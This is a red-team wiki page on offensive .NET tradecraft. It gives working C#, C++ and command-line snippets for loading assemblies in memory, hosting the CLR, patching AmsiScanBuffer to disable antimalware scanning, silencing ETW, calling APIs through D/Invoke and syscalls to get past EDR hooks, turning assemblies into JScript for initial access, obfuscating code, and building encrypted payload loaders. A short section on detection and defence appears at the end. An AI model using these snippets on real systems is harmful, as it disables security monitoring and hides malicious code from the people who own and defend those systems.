---
title: Offensive .NET tradecraft
slug: offensive-dotnet-tradecraft
aliases: [dotnet-tradecraft, csharp-red-team, offensive-csharp]
---

> **TL;DR:** .NET assemblies can be loaded and executed entirely in memory via `Assembly.Load`, making C# the lingua franca of Windows post-exploitation tooling. The tradecraft covers in-memory execution, AMSI/ETW patching, P/Invoke vs D/Invoke for API access, obfuscation, and .NET-to-JScript for initial access.

## What it is
The .NET Common Language Runtime (CLR) is present on every modern Windows system. Red-team tools written in C# — Seatbelt, Rubeus, SharpHound, Certify — leverage `Assembly.Load(byte[])` to run without dropping an EXE to disk. The tradecraft is: write the tool in C#, compile to a .NET assembly, load it in-memory from your implant, and handle the AMSI / ETW / CLR detection surface.

## Preconditions / where it applies
- Target runs Windows with .NET Framework 4.x or .NET 6+ (practically all enterprise Windows)
- Code execution in a process that can host the CLR (any unmanaged process can load it via COM)
- If running from Cobalt Strike: `execute-assembly` handles CLR hosting automatically
- AMSI patches needed before loading signatured assemblies in PowerShell or .NET 4.8+ hosts
- Constrained Language Mode (CLM) blocks direct `Add-Type`/reflection in PowerShell — bypass CLM or use an unmanaged loader

## Technique

### In-memory assembly loading

The core primitive — load a compiled .NET assembly from a byte array without writing to disk:

```csharp
// Minimal loader — loads assembly from byte array and invokes Main
byte[] asm = File.ReadAllBytes("Seatbelt.exe"); // or from HTTP, resource, etc.
Assembly a = Assembly.Load(asm);
a.EntryPoint.Invoke(null, new object[] { new string[] { "LogonSessions", "AntiVirus" } });
```

From Cobalt Strike, `execute-assembly` does this inside a fork-and-run process. From a custom loader, you host the CLR yourself:

```cpp
// Unmanaged CLR hosting (C++)
ICLRMetaHost* metaHost; ICLRRuntimeInfo* runtimeInfo; ICLRRuntimeHost* runtimeHost;
CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost);
runtimeHost->Start();
DWORD result;
runtimeHost->ExecuteInDefaultAppDomain(L"C:\\tool.dll", L"Namespace.Class", L"Method", L"args", &result);
```

For fully in-memory execution without `ExecuteInDefaultAppDomain` (which requires a file path), use the `ICLRStrongName` / `AppDomain` COM interfaces to load from a byte array in unmanaged code.

### AMSI and ETW patching for .NET

.NET 4.8+ calls AMSI before JIT-compiling loaded assemblies. Patch before loading:

```csharp
// Patch AmsiScanBuffer — same concept as PowerShell bypass, applied to CLR host
var amsi = LoadLibrary("amsi.dll");
var addr = GetProcAddress(amsi, "AmsiScanBuffer");
VirtualProtect(addr, (UIntPtr)5, 0x40, out uint old);
Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, addr, 4); // xor rax,rax; ret
VirtualProtect(addr, (UIntPtr)5, old, out _);
```

ETW reports assembly loads — patch `EtwEventWrite` in `ntdll.dll` to silence `Microsoft-Windows-DotNETRuntime` events. See [[etw-tampering-deep]].

### P/Invoke vs D/Invoke

**P/Invoke** — static declarations resolved at load time; the import appears in the assembly's metadata and IAT:

```csharp
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
```

Trivially detected by static analysis of the assembly's import table.

**D/Invoke** — dynamic resolution at runtime, avoiding static imports entirely:

```csharp
// D/Invoke: resolve at runtime via GetProcAddress or manual PEB walk
IntPtr ntdll = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("ntdll.dll", "NtAllocateVirtualMemory");
// Or: manual map a fresh copy of ntdll.dll from disk to bypass EDR hooks
var map = DInvoke.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
```

D/Invoke also supports **syscall stubs** — extract the syscall number from `ntdll.dll` on disk, build a stub, call it directly. This bypasses both userland hooks and IAT analysis. See [[syscall-direct-and-indirect]].

### .NET-to-JScript (initial access)

**DotNetToJScript** converts a .NET assembly into a JScript/VBScript that bootstraps the CLR and loads the assembly from a serialised byte stream:

```bash
# Generate JScript that loads a .NET assembly
DotNetToJScript.exe payload.dll --lang=Jscript --ver=v4 -o payload.js
```

**GadgetToJScript** improves on this by using .NET deserialisation gadgets (BinaryFormatter chains) to bootstrap execution, avoiding `DotNetToJScript`'s known COM object patterns:

```bash
GadgetToJScript.exe -a payload.dll -w js -o output.js
```

The output `.js` or `.vbs` runs via `wscript.exe` / `cscript.exe`, or embedded in an HTA / Office macro. AMSI scans the script before execution — combine with [[amsi-bypass]].

### Obfuscation and evasion

**ConfuserEx** — open-source .NET obfuscator:

```bash
# Confuser CLI
Confuser.CLI.exe -o obfuscated/ project.crproj
```

Key protections: control-flow flattening, string encryption, anti-tamper, anti-debug, symbol renaming. Mature EDR vendors detect ConfuserEx patterns — it raises the bar against static signatures, not against behavioural detection.

**Manual techniques:**
- String encryption: AES-encrypt all strings, decrypt at runtime
- Rename namespaces/classes/methods to benign names (avoid `Mimikatz`, `Rubeus`, etc.)
- Remove PDB paths, assembly metadata, version info
- Split functionality across multiple assemblies loaded sequentially

### Assembly embedding

Embed tool assemblies as encrypted resources in a loader:

```csharp
// Loader: decrypt embedded resource, Assembly.Load, invoke
var encrypted = Assembly.GetExecutingAssembly()
    .GetManifestResourceStream("payload.bin");
byte[] raw = AesDecrypt(ReadStream(encrypted), key);
Assembly.Load(raw).EntryPoint.Invoke(null, new object[] { args });
```

This pattern lets you ship a single EXE/DLL that carries multiple tools — load the right one based on command-line args.

## Detection and defence
- `Microsoft-Windows-DotNETRuntime` ETW provider logs assembly loads including `Assembly.Load(byte[])` — Event ID 152 shows assemblies loaded from memory with no file path
- CLR load in an unmanaged process (e.g., `notepad.exe` suddenly hosting `clrjit.dll`) is a high-fidelity signal
- WDAC / AppLocker in DLL enforcement mode blocks unsigned assemblies from loading
- AMSI integration in .NET 4.8+ scans assembly content pre-JIT — intact AMSI catches known tools
- Assembly metadata analysis: default ConfuserEx markers, `GuidAttribute` reuse, empty `AssemblyInfo`
- D/Invoke's manual mapping leaves no `LdrLoadDll` event — but the raw file read of `ntdll.dll` from `System32` is anomalous

## References
- [TheWover — DInvoke](https://thewover.github.io/Dynamic-Invoke/) — D/Invoke architecture and usage
- [James Forshaw — DotNetToJScript](https://github.com/tyranid/DotNetToJScript) — original tool
- [med0x2e — GadgetToJScript](https://github.com/med0x2e/GadgetToJScript)
- [ConfuserEx](https://github.com/mkaring/ConfuserEx) — .NET obfuscator
- [ired.team — Loading .NET assemblies](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-assemblies-in-memory) — end-to-end walkthrough

See also: [[amsi-bypass]], [[etw-tampering-deep]], [[syscall-direct-and-indirect]], [[edr-hooks-and-unhooking]], [[av-evasion-primer]], [[donut-shellcode-generation]], [[cobalt-strike-operations]], [[execute-assembly-alternatives]]
